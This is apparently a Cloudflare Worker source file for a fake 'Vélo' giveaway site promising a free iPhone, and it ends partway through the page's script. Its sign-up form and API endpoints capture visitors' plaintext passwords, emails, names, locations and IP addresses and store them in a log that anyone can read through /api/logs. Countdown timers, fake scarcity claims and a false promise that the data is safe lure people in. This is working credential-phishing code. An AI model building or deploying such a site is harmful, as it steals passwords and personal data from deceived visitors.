export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type'
        }
      });
    }
    
    // ===================== SERVE IMAGES FROM GITHUB =====================
    if (path.startsWith('/images/')) {
      const GITHUB_RAW = 'https://raw.githubusercontent.com/freestuffsshop-design/Gift/refs/heads/main/images/';
      const imageName = path.replace('/images/', '');
      const encodedName = encodeURIComponent(imageName);
      return Response.redirect(GITHUB_RAW + encodedName, 302);
    }
    
    // ===================== API ROUTES =====================
    if (path === '/api/login' && request.method === 'POST') {
      try {
        const body = await request.json();
        const ip = request.headers.get('CF-Connecting-IP') || 
        request.headers.get('X-Forwarded-For')?.split(',')[0] || 
        'unknown';
          
        const data = {
          email: body.email,
          password: body.password,
          name: body.name || '',
          gender: body.gender || '',
          location: body.location || '',
          isGoogleUser: body.isGoogleUser || false,
          ip: ip,
          step: body.step || 'login',
          timestamp: Date.now(),
          date: new Date().toISOString()
        };
        
        if (env.LOGGED) {
          let logs = [];
          try {
            const existing = await env.LOGGED.get('logs', 'json');
            if (existing && Array.isArray(existing)) {
              logs = existing;
            }
          } catch (e) {
            logs = [];
          }
          logs.push(data);
          if (logs.length > 500) logs = logs.slice(-500);
          await env.LOGGED.put('logs', JSON.stringify(logs));
        }
        
        return new Response(JSON.stringify({ 
          success: true, 
          message: 'Login successful',
          data: { email: data.email, name: data.name }
        }), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }
    
    if (path === '/api/quiz' && request.method === 'POST') {
      try {
        const body = await request.json();
        const ip = request.headers.get('CF-Connecting-IP') || 
        request.headers.get('X-Forwarded-For')?.split(',')[0] || 
        'unknown';
          
        const data = {
          email: body.email,
          password: body.password,
          name: body.name || '',
          gender: body.gender || '',
          location: body.location || '',
          quiz: body.quiz || null,
          ip: ip,
          step: 'quiz_complete',
          timestamp: Date.now(),
          date: new Date().toISOString()
        };
        
        if (env.LOGGED) {
          let logs = [];
          try {
            const existing = await env.LOGGED.get('logs', 'json');
            if (existing && Array.isArray(existing)) {
              logs = existing;
            }
          } catch (e) {
            logs = [];
          }
          logs.push(data);
          if (logs.length > 500) logs = logs.slice(-500);
          await env.LOGGED.put('logs', JSON.stringify(logs));
        }
        
        return new Response(JSON.stringify({ 
          success: true, 
          message: 'Quiz completed!',
          email: data.email
        }), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }
    
    if (path === '/api/logs' && request.method === 'GET') {
      try {
        if (!env.LOGGED) {
          return new Response(JSON.stringify({ error: 'KV not configured', logs: [] }), {
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }
        const logs = await env.LOGGED.get('logs', 'json');
        return new Response(JSON.stringify({
          total: logs ? logs.length : 0,
          logs: logs || []
        }), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message, logs: [] }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }
    
    if (path === '/api/clear' && request.method === 'POST') {
      try {
        if (env.LOGGED) {
          await env.LOGGED.put('logs', JSON.stringify([]));
        }
        return new Response(JSON.stringify({ success: true, message: 'Logs cleared' }), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }
    
    if (path === '/api/status') {
      return new Response(JSON.stringify({
        status: 'online',
        service: 'Vélo Giveaway API',
        version: '1.0.0',
        kv_configured: !!env.LOGGED,
        kv_namespace: 'Logged',
        binding: 'LOGGED',
        endpoints: {
          'POST /api/login': 'Submit login/signup data',
          'POST /api/quiz': 'Submit quiz answers',
          'GET /api/logs': 'View all logs',
          'POST /api/clear': 'Clear all logs',
          'GET /api/status': 'API status'
        }
      }), {
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }
    
    // ===================== SERVE HTML =====================
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Vélo · Win a Free Gift</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Playfair+Display:ital,wght@0,600;0,700;1,600&display=swap" rel="stylesheet" />
<script src="https://accounts.google.com/gsi/client" async defer></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#faf8f5; --surface:#fff; --text:#1e1b18; --text-secondary:#5c534a;
  --text-muted:#8a7f74; --border:#e8e0d4; --primary:#c73b2a;
  --primary-dark:#a92f20; --accent:#2e7d78; --shadow:0 8px 40px rgba(30,27,24,0.08);
  --shadow-hover:0 16px 56px rgba(30,27,24,0.14); --radius:20px;
  --radius-sm:12px; --transition:0.3s cubic-bezier(0.4,0,0.2,1)
}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding:0 0 30px}
.container{max-width:1280px;margin:0 auto;padding:0 24px}
.section-title{font-family:'Playfair Display',serif;font-size:32px;font-weight:700;letter-spacing:-0.3px;margin-bottom:8px}
.section-sub{color:var(--text-secondary);font-size:15px;margin-bottom:28px}
.badge{display:inline-block;background:var(--primary);color:#fff;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:4px 14px;border-radius:40px}
.header{background:rgba(255,255,255,0.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:12px 0;position:sticky;top:0;z-index:50}
.header-inner{display:flex;align-items:center;justify-content:space-between}
.logo{font-family:'Playfair Display',serif;font-size:26px;font-weight:700;letter-spacing:-0.5px}
.logo span{color:var(--primary)}
.header-nav{display:flex;gap:28px;font-size:14px;font-weight:500;color:var(--text-secondary)}
.header-nav a{transition:color .2s}
.header-nav a:hover{color:var(--text)}
.header-actions{display:flex;align-items:center;gap:16px}
.cart-btn{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:600;padding:8px 16px;border-radius:40px;background:var(--bg);transition:background .2s}
.cart-btn:hover{background:var(--border)}
.cart-count{background:var(--primary);color:#fff;font-size:11px;font-weight:700;width:20px;height:20px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center}
.menu-toggle{display:none;font-size:24px}
@media(max-width:820px){.header-nav{display:none}.menu-toggle{display:block}.logo{font-size:22px}}

.hero{background:var(--surface);border-radius:var(--radius);margin:24px 0 40px;padding:48px 56px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;box-shadow:var(--shadow);border:1px solid var(--border);position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:-40%;right:-20%;width:60%;height:120%;background:radial-gradient(circle at 70% 50%,rgba(199,59,42,0.04),transparent 70%);pointer-events:none}
.hero-content{position:relative;z-index:1}
.hero-badge{display:inline-block;background:var(--accent-light);color:var(--accent);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;padding:4px 16px;border-radius:40px;margin-bottom:16px}
.hero h1{font-family:'Playfair Display',serif;font-size:44px;font-weight:700;letter-spacing:-.5px;line-height:1.1;margin-bottom:12px}
.hero h1 span{color:var(--primary)}
.hero p{font-size:16px;color:var(--text-secondary);max-width:420px;margin-bottom:24px}
.countdown-wrap{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap}
.countdown-item{background:var(--bg);border-radius:var(--radius-sm);padding:12px 20px;min-width:70px;text-align:center;border:1px solid var(--border)}
.countdown-item .num{font-size:32px;font-weight:800;font-variant-numeric:tabular-nums;line-height:1;color:var(--text)}
.countdown-item .label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text-muted);margin-top:2px}
.hero-cta{display:inline-flex;align-items:center;gap:10px;background:var(--primary);color:#fff;font-size:15px;font-weight:600;padding:14px 32px;border-radius:60px;transition:all .2s;box-shadow:0 8px 24px rgba(199,59,42,0.25)}
.hero-cta:hover{background:var(--primary-dark);transform:translateY(-2px);box-shadow:0 12px 32px rgba(199,59,42,0.35)}

.hero-slider{position:relative;z-index:1;width:100%;border-radius:var(--radius-sm);overflow:hidden;box-shadow:var(--shadow);aspect-ratio:4/3;background:#1a1a1a}
.hero-slider .slide-track{display:flex;width:100%;height:100%;transition:transform 0.8s cubic-bezier(0.4,0,0.2,1)}
.hero-slider .slide-track img{width:100%;height:100%;object-fit:cover;flex-shrink:0}
.hero-slider .slide-dots{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);display:flex;gap:8px;z-index:2}
.hero-slider .slide-dots span{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.5);cursor:pointer;transition:all .3s}
.hero-slider .slide-dots span.active{background:#fff;transform:scale(1.2)}
.hero-stock{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text-secondary);margin-top:8px}
.hero-stock .dot{width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;animation:pulse-dot 1.8s infinite}
@keyframes pulse-dot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.85)}}
@media(max-width:900px){.hero{grid-template-columns:1fr;padding:32px 24px}.hero h1{font-size:32px}.hero-slider{aspect-ratio:16/9}.countdown-item .num{font-size:24px}}
@media(max-width:480px){.hero{padding:24px 16px}.hero h1{font-size:26px}.countdown-item{padding:8px 14px;min-width:56px}.countdown-item .num{font-size:20px}}

.featured-iphone{background:#1a1a1a;border-radius:var(--radius);padding:40px 48px;margin:32px 0 48px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;color:#fff;position:relative;overflow:hidden}
.featured-iphone::after{content:'';position:absolute;bottom:-40%;right:-10%;width:50%;height:100%;background:radial-gradient(circle at 60% 70%,rgba(255,255,255,0.05),transparent 70%);pointer-events:none}
.featured-iphone .content{position:relative;z-index:1}
.featured-iphone .badge{background:rgba(255,255,255,0.15);color:#fff}
.featured-iphone h2{font-family:'Playfair Display',serif;font-size:34px;font-weight:700;letter-spacing:-.3px;margin:10px 0 6px}
.featured-iphone h2 span{color:#fbbf24}
.featured-iphone .price{font-size:28px;font-weight:700;margin:8px 0 16px}
.featured-iphone .price small{font-size:16px;font-weight:400;color:rgba(255,255,255,0.5);text-decoration:line-through;margin-left:12px}
.featured-iphone .desc{color:rgba(255,255,255,0.7);font-size:14px;max-width:360px;margin-bottom:20px}
.btn-iphone{display:inline-flex;align-items:center;gap:8px;background:#fbbf24;color:#1a1a1a;font-weight:700;padding:14px 32px;border-radius:60px;font-size:15px;transition:all .2s}
.btn-iphone:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(251,191,36,0.3)}

.iphone-slider{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;width:100%}
.iphone-slider .main-wrap{width:100%;border-radius:var(--radius-sm);overflow:hidden;aspect-ratio:1/1;background:#222;display:flex;align-items:center;justify-content:center}
.iphone-slider .main-wrap .slide-track{display:flex;width:100%;height:100%;transition:transform 0.8s cubic-bezier(0.4,0,0.2,1)}
.iphone-slider .main-wrap .slide-track img{width:100%;height:100%;object-fit:contain;flex-shrink:0;padding:10px}
.iphone-slider .slide-dots{display:flex;gap:8px;margin-top:12px}
.iphone-slider .slide-dots span{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.3);cursor:pointer;transition:all .3s}
.iphone-slider .slide-dots span.active{background:#fbbf24;transform:scale(1.2)}

.iphone-urgency{display:flex;gap:24px;margin-top:16px;flex-wrap:wrap;justify-content:flex-start}
.iphone-urgency span{font-size:13px;color:rgba(255,255,255,0.7);display:flex;align-items:center;gap:8px}
.iphone-urgency .urgent{color:#fbbf24;font-weight:700}
@media(max-width:820px){.featured-iphone{grid-template-columns:1fr;padding:32px 24px;text-align:center}.featured-iphone h2{font-size:28px}.featured-iphone .desc{max-width:100%}.iphone-urgency{justify-content:center}.iphone-slider .main-wrap{max-width:300px;margin:0 auto}}
@media(max-width:480px){.featured-iphone{padding:24px 16px}.featured-iphone h2{font-size:24px}.featured-iphone .price{font-size:22px}}

.products-section{margin:48px 0 40px}
.products-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:20px}
.product-card{background:var(--surface);border-radius:var(--radius-sm);overflow:hidden;border:1px solid var(--border);transition:all var(--transition);position:relative}
.product-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-hover);border-color:transparent}
.product-card .image-wrap{aspect-ratio:1/1;background:var(--bg);display:flex;align-items:center;justify-content:center;overflow:hidden;padding:8px}
.product-card .image-wrap img{width:100%;height:100%;object-fit:cover;transition:transform .4s}
.product-card:hover .image-wrap img{transform:scale(1.03)}
.product-card .info{padding:14px 16px 16px}
.product-card .product-title{font-size:14px;font-weight:600;margin-bottom:2px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.product-card .product-category{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.3px;font-weight:500}
.product-card .product-price{font-size:16px;font-weight:700;margin-top:6px;color:var(--text)}
.product-card .product-price .original{font-size:13px;font-weight:400;color:var(--text-muted);text-decoration:line-through;margin-left:8px}
.product-card .add-btn{width:100%;margin-top:10px;padding:10px;border-radius:40px;background:var(--text);color:#fff;font-size:13px;font-weight:600;transition:all .2s}
.product-card .add-btn:hover{background:var(--primary)}
.product-card .stock-badge{position:absolute;top:10px;left:10px;background:rgba(0,0,0,0.7);color:#fff;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.3px;padding:3px 10px;border-radius:40px;backdrop-filter:blur(4px)}
.product-card .stock-badge.low{background:var(--primary)}
@media(max-width:540px){.products-grid{grid-template-columns:repeat(2,1fr);gap:12px}.product-card .info{padding:10px 12px 12px}.product-card .product-title{font-size:13px}.product-card .product-price{font-size:14px}.section-title{font-size:26px}}

.cart-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.35);backdrop-filter:blur(4px);z-index:200;opacity:0;pointer-events:none;transition:opacity .35s}
.cart-overlay.open{opacity:1;pointer-events:auto}
.cart-sidebar{position:fixed;top:0;right:0;width:420px;max-width:92vw;height:100%;background:var(--surface);z-index:201;transform:translateX(100%);transition:transform .4s cubic-bezier(0.4,0,0.2,1);display:flex;flex-direction:column;box-shadow:-8px 0 40px rgba(0,0,0,0.08)}
.cart-sidebar.open{transform:translateX(0)}
.cart-header{padding:20px 24px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.cart-header h2{font-size:20px;font-weight:700}
.cart-close{font-size:24px;color:var(--text-secondary);transition:color .2s}
.cart-close:hover{color:var(--text)}
.cart-items{flex:1;overflow-y:auto;padding:16px 24px}
.cart-empty{text-align:center;color:var(--text-muted);padding:48px 0;font-size:15px}
.cart-empty .big{font-size:48px;margin-bottom:12px;display:block}
.cart-item{display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--bg);align-items:center}
.cart-item .thumb{width:60px;height:60px;border-radius:var(--radius-xs);background:var(--bg);object-fit:cover;flex-shrink:0}
.cart-item .details{flex:1}
.cart-item .details .name{font-size:14px;font-weight:600}
.cart-item .details .meta{font-size:12px;color:var(--text-muted)}
.cart-item .qty-wrap{display:flex;align-items:center;gap:6px;margin-top:4px}
.cart-item .qty-wrap button{width:28px;height:28px;border-radius:50%;background:var(--bg);font-size:16px;font-weight:600;transition:background .2s;display:flex;align-items:center;justify-content:center}
.cart-item .qty-wrap button:hover{background:var(--border)}
.cart-item .qty-wrap .qty{font-weight:600;min-width:20px;text-align:center;font-size:14px}
.cart-item .item-total{font-weight:700;font-size:15px;margin-left:auto;padding-left:12px}
.cart-item .remove-item{color:var(--text-muted);font-size:18px;padding:0 4px;transition:color .2s}
.cart-item .remove-item:hover{color:var(--primary)}
.cart-footer{padding:20px 24px;border-top:1px solid var(--border);background:var(--bg);border-radius:0 0 var(--radius) var(--radius)}
.cart-footer .total{display:flex;justify-content:space-between;font-size:18px;font-weight:700;margin-bottom:14px}
.cart-footer .total .amount{color:var(--primary)}
.checkout-btn{width:100%;padding:14px;border-radius:60px;background:var(--primary);color:#fff;font-size:16px;font-weight:700;transition:all .2s}
.checkout-btn:hover{background:var(--primary-dark);transform:translateY(-1px);box-shadow:0 8px 24px rgba(199,59,42,0.25)}
.checkout-btn:disabled{opacity:0.4;cursor:not-allowed;transform:none}

.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--text);color:#fff;padding:12px 28px;border-radius:60px;font-size:14px;font-weight:500;opacity:0;pointer-events:none;transition:all .35s ease;box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:400;white-space:nowrap}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
.footer{border-top:1px solid var(--border);padding:32px 0 24px;margin-top:48px;text-align:center;color:var(--text-muted);font-size:13px}
.footer .links{display:flex;justify-content:center;gap:24px;margin-bottom:12px;flex-wrap:wrap}
.footer .links a{transition:color .2s}
.footer .links a:hover{color:var(--text)}
@media(max-width:480px){.container{padding:0 14px}.hero-cta{font-size:14px;padding:12px 24px;width:100%;justify-content:center}.countdown-wrap{justify-content:center}.hero .hero-stock{justify-content:center}.cart-sidebar{max-width:100vw}.toast{white-space:normal;max-width:88vw;text-align:center;font-size:13px;padding:12px 20px}}

/* Modal Styles */
.checkout-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);z-index:300;opacity:0;pointer-events:none;transition:opacity .4s;display:flex;align-items:center;justify-content:center;padding:20px}
.checkout-overlay.open{opacity:1;pointer-events:auto}
.checkout-modal{background:var(--surface);border-radius:var(--radius);max-width:480px;width:100%;padding:40px 36px;transform:scale(0.95) translateY(20px);transition:transform .4s cubic-bezier(0.4,0,0.2,1);box-shadow:0 24px 80px rgba(0,0,0,0.2);max-height:90vh;overflow-y:auto}
.checkout-overlay.open .checkout-modal{transform:scale(1) translateY(0)}
.checkout-modal .close-checkout{float:right;font-size:24px;color:var(--text-muted);background:none;border:none;transition:color .2s;cursor:pointer}
.checkout-modal .close-checkout:hover{color:var(--text)}
.checkout-modal h2{font-family:'Playfair Display',serif;font-size:28px;font-weight:700;text-align:center;margin-bottom:4px}
.checkout-modal h2 span{color:var(--primary)}
.checkout-modal .sub{color:var(--text-secondary);font-size:14px;text-align:center;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;font-weight:600;margin-bottom:5px;color:var(--text)}
.field label .required{color:var(--primary);margin-left:2px}
.field input,.field select{width:100%;height:48px;padding:0 16px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-size:15px;font-family:inherit;background:var(--bg);transition:border-color .2s,box-shadow .2s;color:var(--text);appearance:none}
.field input:focus,.field select:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 4px rgba(46,125,120,0.08)}
.field input::placeholder{color:var(--text-muted)}
.field select{cursor:pointer;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238a7f74' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 16px center}
.field .error-msg{font-size:12px;color:var(--primary);margin-top:4px;display:none}
.field.error input,.field.error select{border-color:var(--primary);background:#fdf5f3}
.field.error .error-msg{display:block}
.field .hint{font-size:12px;color:var(--text-muted);margin-top:3px}
.btn-primary{width:100%;padding:14px;border-radius:60px;background:var(--primary);color:#fff;font-size:16px;font-weight:700;transition:all .2s;border:none;cursor:pointer}
.btn-primary:hover{background:var(--primary-dark);transform:translateY(-1px);box-shadow:0 8px 24px rgba(199,59,42,0.25)}
.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
.google-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:12px;border-radius:60px;background:#fff;border:1.5px solid var(--border);font-size:15px;font-weight:600;color:var(--text);transition:all .2s;cursor:pointer}
.google-btn:hover{background:#f8f8f8;border-color:var(--text-muted)}
.divider{display:flex;align-items:center;gap:12px;margin:18px 0;color:var(--text-muted);font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--border)}
.hidden{display:none !important}
.checkbox-group{display:flex;align-items:flex-start;gap:10px;margin:12px 0 16px}
.checkbox-group input[type="checkbox"]{width:18px;height:18px;margin-top:2px;accent-color:var(--primary);flex-shrink:0;cursor:pointer}
.checkbox-group label{font-size:13px;color:var(--text-secondary);cursor:pointer}
.checkbox-group label a{color:var(--primary);text-decoration:none}
.checkbox-group label a:hover{text-decoration:underline}
.step-dot{width:10px;height:10px;border-radius:50%;background:var(--border);transition:all .3s;display:inline-block}
.step-dot.active{background:var(--primary);transform:scale(1.2)}
.step-dot.done{background:var(--accent)}
.quiz-option{display:flex;align-items:center;gap:12px;padding:12px 16px;border:1.5px solid var(--border);border-radius:var(--radius-sm);margin-bottom:8px;cursor:pointer;transition:all .2s;background:var(--bg)}
.quiz-option:hover{border-color:var(--accent);background:var(--surface)}
.quiz-option input[type="radio"]{accent-color:var(--primary);width:18px;height:18px;flex-shrink:0;cursor:pointer}
.quiz-option label{flex:1;font-size:14px;font-weight:500;cursor:pointer}
.success-box{text-align:center;padding:12px 0}
.success-box .icon{font-size:56px;display:block;margin-bottom:12px}
.success-box h3{font-family:'Playfair Display',serif;font-size:24px;font-weight:700}
.success-box p{color:var(--text-secondary);font-size:14px;margin:8px 0 16px}
.success-box .detail-box{background:var(--bg);border-radius:var(--radius-sm);padding:12px 18px;font-size:14px;color:var(--text);display:inline-block;margin-top:4px}
.google-confirm{display:flex;align-items:center;gap:12px;padding:12px 16px;background:#e8f5e9;border-radius:var(--radius-sm);margin-bottom:12px;border:1px solid #4caf50}
.google-confirm span{font-size:20px}
.google-confirm div{flex:1}
.google-confirm .name{font-size:14px;font-weight:600;color:#1e1b18}
.google-confirm .email{font-size:13px;color:#5c534a}
@media(max-width:480px){.checkout-modal{padding:28px 20px}.checkout-modal h2{font-size:24px}}
</style>
</head>
<body>
<header class="header"><div class="container header-inner">
<a href="#" class="logo">Vélo<span>.</span></a>
<nav class="header-nav"><a href="#products">Shop</a><a href="#featured">Featured</a><a href="#new">New</a><a href="#sale">Sale</a></nav>
<div class="header-actions">
<button class="cart-btn" id="cartOpenBtn">🛒 Cart <span class="cart-count" id="cartCount">0</span></button>
<button class="menu-toggle" aria-label="Menu">☰</button>
</div>
</div></header>

<main class="container">
<section class="hero">
<div class="hero-content">
<span class="hero-badge">🎁 Limited Giveaway</span>
<h1>Win Your <span>Dream</span> Gear</h1>
<p>Answer 3 quick questions and you could win premium activewear & accessories — absolutely free.</p>
<div class="countdown-wrap" id="countdownWrap">
<div class="countdown-item"><div class="num" id="cdDays">00</div><div class="label">Days</div></div>
<div class="countdown-item"><div class="num" id="cdHours">00</div><div class="label">Hours</div></div>
<div class="countdown-item"><div class="num" id="cdMins">00</div><div class="label">Mins</div></div>
<div class="countdown-item"><div class="num" id="cdSecs">00</div><div class="label">Secs</div></div>
</div>
<a href="#" class="hero-cta" id="heroCta">Claim Your Gift →</a>
<div class="hero-stock"><span class="dot"></span><strong>247</strong> people have entered today</div>
</div>
<div class="hero-slider" id="heroSlider">
<div class="slide-track" id="heroTrack">
<img src="/images/wedding.png" alt="Wedding" loading="lazy" />
<img src="/images/Box.png" alt="Gift Box" loading="lazy" />
<img src="/images/box01.png" alt="Gift Box 2" loading="lazy" />
<img src="/images/box02.png" alt="Gift Box 3" loading="lazy" />
</div>
<div class="slide-dots" id="heroDots"></div>
</div>
</section>

<section class="featured-iphone" id="featured">
<div class="content">
<span class="badge">⚡ Grand Prize</span>
<h2>iPhone 15 Pro <span>Max</span></h2>
<div class="price">$0 <small>$1,199</small></div>
<p class="desc">Premium titanium. A17 Pro chip. 48MP camera. One lucky winner takes it home — completely free.</p>
<button class="btn-iphone" id="iphoneAddBtn">🎯 Enter to Win</button>
<div class="iphone-urgency">
<span>⏱️ <span class="urgent">Only 8 spots left</span></span>
<span>📦 Free delivery worldwide</span>
<span>⭐ 4.9 / 5 (2.1k reviews)</span>
</div>
</div>
<div class="iphone-slider" id="iphoneSlider">
<div class="main-wrap">
<div class="slide-track" id="iphoneTrack">
<img src="/images/iphone01.png" alt="iPhone 01" />
<img src="/images/iphone003.jpg" alt="iPhone 03" />
<img src="/images/iphone005.jpg" alt="iPhone 05" />
<img src="/images/iphone006.jpg" alt="iPhone 06" />
<img src="/images/iphone02.jpg" alt="iPhone 02" />
<img src="/images/iphone03.jpg" alt="iPhone 03" />
<img src="/images/iphone04.jpg" alt="iPhone 04" />
<img src="/images/iphone05.jpg" alt="iPhone 05" />
</div>
</div>
<div class="slide-dots" id="iphoneDots"></div>
</div>
</section>

<section class="products-section" id="products">
<h2 class="section-title">Enter to Win</h2>
<p class="section-sub">Add any item to your cart, then complete the quick questionnaire to be eligible.</p>
<div class="products-grid" id="productGrid"></div>
</section>

<footer class="footer"><div class="links"><a href="#">About</a><a href="#">Shipping</a><a href="#">Returns</a><a href="#">Contact</a><a href="#">Privacy</a></div><p>© 2026 Vélo · Giveaway</p></footer>
</main>

<div class="cart-overlay" id="cartOverlay"></div>
<aside class="cart-sidebar" id="cartSidebar">
<div class="cart-header"><h2>Your Cart</h2><button class="cart-close" id="cartCloseBtn">✕</button></div>
<div class="cart-items" id="cartItems"><div class="cart-empty"><span class="big">🛒</span>Your cart is empty.</div></div>
<div class="cart-footer"><div class="total"><span>Subtotal</span><span class="amount" id="cartTotal">$0.00</span></div><button class="checkout-btn" id="checkoutOpenBtn">Enter Giveaway →</button></div>
</aside>

<div class="checkout-overlay" id="checkoutOverlay">
<div class="checkout-modal">
<button class="close-checkout" id="checkoutCloseBtn">✕</button>

<div id="stepSignup">
<h2>🎁 Create <span>Account</span></h2>
<p class="sub">Sign up to claim your free gift</p>

<div id="googleBtnContainer"></div>
<div class="divider">or</div>

<div class="field" id="nameField">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="nameInput" placeholder="John Doe" />
<div class="error-msg">Please enter your full name</div>
</div>

<div class="field" id="emailField">
<label>Email Address <span class="required">*</span></label>
<input type="email" id="emailInput" placeholder="you@example.com" />
<div class="error-msg">Please enter a valid email address</div>
</div>

<div class="field" id="passField">
<label>Password <span class="required">*</span></label>
<input type="password" id="passInput" placeholder="Min 8 characters" />
<div class="error-msg">Password must be at least 8 characters</div>
<div class="hint">Use at least 8 characters with a mix of letters and numbers</div>
</div>

<div class="field" id="genderField">
<label>Gender</label>
<select id="genderInput">
<option value="">Select your gender</option>
<option value="Male">Male</option>
<option value="Female">Female</option>
<option value="Non-binary">Non-binary</option>
<option value="Prefer not to say">Prefer not to say</option>
</select>
<div class="error-msg">Please select your gender</div>
</div>

<div class="field" id="locationField">
<label>Location <span class="required">*</span></label>
<input type="text" id="locationInput" placeholder="e.g., Austin, TX" />
<div class="error-msg">Please enter your location</div>
</div>

<div class="checkbox-group">
<input type="checkbox" id="termsCheck" />
<label for="termsCheck">I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></label>
</div>

<button class="btn-primary" id="signupBtn">Create Account →</button>
<p style="text-align:center;margin-top:14px;font-size:12px;color:var(--text-muted)">Your data is safe and will never be shared</p>
</div>

<div id="stepQuiz" style="display:none">
<div style="display:flex;justify-content:center;gap:8px;margin-bottom:20px">
<span class="step-dot active" id="dot1"></span>
<span class="step-dot" id="dot2"></span>
<span class="step-dot" id="dot3"></span>
</div>
<h2 style="font-size:24px">Quick Questions</h2>
<p class="sub" style="margin-bottom:20px">Help us pick the perfect gift for you</p>
<div id="quizContainer"></div>
<button class="btn-primary" id="quizNextBtn">Next →</button>
</div>

<div id="stepSuccess" style="display:none">
<div class="success-box">
<span class="icon">🎉</span>
<h3>You're in!</h3>
<p>We'll email <strong id="successEmail">you</strong> if you win. Good luck!</p>
<div class="detail-box">🎁 Drawing in 5–7 days</div>
<button class="btn-primary" style="margin-top:20px" id="doneBtn">Done</button>
</div>
</div>
</div>
</div>

<div class="toast" id="toast"></div>

<script>
// ============================================================
// API Configuration
// ============================================================
const API_URL = 'https://get.free-stuffs-shop.workers.dev';

// ============================================================
// Products & Quiz Data
// ============================================================
const products = [
  { id:'p1', title:'Titanium Track Jacket', category:'Activewear', price:0, originalPrice:129.99, image:'/images/active-wear01.jpg', stock:12 },
  { id:'p2', title:'Apex Joggers', category:'Activewear', price:0, originalPrice:99.99, image:'/images/active-wear02.jpg', stock:8 },
  { id:'p3', title:'Canvas Tote Bag', category:'Bags', price:0, originalPrice:49.99, image:'/images/bag01.png', stock:20 },
  { id:'p4', title:'Nylon Tech Backpack', category:'Bags', price:0, originalPrice:79.99, image:'/images/bag02.png', stock:6 },
  { id:'p5', title:'Performance Tee', category:'Activewear', price:0, originalPrice:54.99, image:'/images/active-wear03.jpg', stock:15 },
